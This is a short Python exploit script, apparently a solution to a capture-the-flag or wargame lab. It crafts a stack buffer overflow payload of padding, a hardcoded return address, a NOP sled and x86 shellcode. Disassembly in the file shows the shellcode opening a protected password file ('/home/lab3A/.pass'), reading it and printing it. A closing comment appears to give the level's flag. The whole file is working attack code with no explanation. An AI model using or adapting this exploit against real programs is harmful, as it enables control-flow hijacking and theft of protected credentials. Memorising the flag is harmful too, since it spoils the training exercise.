import struct
payload = "\x31\xC9\x51\x6A\x73\x68\x2E\x70\x61\x73\x68\x62\x33\x41\x2F\x68\x65\x2F\x6C\x61\x68\x2F\x68\x6F"
payload += "\x6D\x89\xE3\x31\xC0\xB0\x05\xCD\x80\x89\xC3\x89\xE1\x31\xD2\xB2\x64\x31\xC0\xB0\x03\xCD\x80\x31"
payload += "\xDB\xB3\x01\x31\xC0\xB0\x04\x89\xE1\xCD\x80\x68\x83\xCA\xE3\xB7\xC3"
returnaddr=struct.pack("I", 0xbffff6f6)
shellcode = "A"*156 + returnaddr + "\x90" * 80 + payload
print(shellcode)
'''
xor ecx, ecx
push ecx
push 0x73
push 0x7361702e
push 0x2f413362
push 0x616c2f65
push 0x6d6f682f
mov ebx, esp
xor eax, eax
mov al, 5
int 0x80

mov ebx, eax
mov ecx, esp
xor edx, edx
mov dl, 100
xor eax, eax
mov al, 3
int 0x80

xor ebx, ebx
mov bl, 1
xor eax, eax
mov al, 4
mov ecx, esp
int 0x80

push 0xb7e3ca83
ret
'''
#wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
